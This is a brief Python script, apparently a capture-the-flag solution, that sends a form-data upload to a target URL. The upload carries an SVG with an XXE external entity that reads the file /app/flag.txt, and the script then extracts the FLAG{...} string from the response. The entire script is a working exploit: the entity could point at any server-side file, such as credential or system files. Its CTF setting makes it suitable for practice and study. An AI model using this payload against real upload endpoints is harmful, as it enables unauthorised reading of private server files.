import re
import requests
import sys

'''
@文件命名：X-077-24
@使用方式: python X-077-24.py url
@简述思路: SVG XXE 读取 /app/flag.txt，上传后从响应中提取 flag。
'''


def Scan(url):
    payload = """<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg"><text y="20">&xxe;</text></svg>
"""
    data = {"name": "a", "surname": "b", "address": "c"}
    files = {"image": ("poc.svg", payload, "image/svg+xml")}
    r = requests.post(url + "/", data=data, files=files, timeout=10)
    return re.search(r"FLAG\{.*?\}", r.text).group(0)


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
